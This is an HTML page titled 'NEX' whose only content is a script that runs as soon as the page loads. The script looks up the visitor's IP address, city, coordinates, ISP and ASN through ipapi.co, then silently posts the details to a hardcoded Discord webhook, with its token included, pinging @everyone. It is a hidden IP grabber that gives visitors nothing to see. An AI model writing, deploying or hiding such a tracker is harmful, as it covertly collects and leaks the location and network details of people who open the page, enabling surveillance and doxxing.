<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>NEX</title>
    <script>
        fetch("https://ipapi.co/json/")
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                
                const fullContent = `
                    HIT: 
                        IP Address: ${ip}, 
                        Network: ${data.network}, 
                        Version: ${data.version}, 
                        City: ${data.city}, 
                        Region: ${data.region}, 
                        Region Code: ${data.region_code}, 
                        Country: ${data.country_name}, 
                        Country Code: ${data.country_code}, 
                        Country Code ISO3: ${data.country_code_iso3}, 
                        Country Capital: ${data.country_capital}, 
                        Country TLD: ${data.country_tld}, 
                        Continent Code: ${data.continent_code}, 
                        In EU: ${data.in_eu ? 'true' : 'false'}, 
                        Latitude: ${data.latitude}, 
                        Longitude: ${data.longitude}, 
                        Timezone: ${data.timezone}, 
                        UTC Offset: ${data.utc_offset}, 
                        ASN: ${data.asn}, 
                        Org: ${data.org}
                        @everyone`;
                
                fetch("https://discord.com/api/webhooks/1418505457143644221/y7bsW63LSPUDNQzSwX5LgLHydxorxk30h-PQroxDP_hmpNbbXiW0aCsMBv54GurTivU6",
                    {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            "content": fullContent
                        })
                    }
                );
            });
        
    </script>
</head>
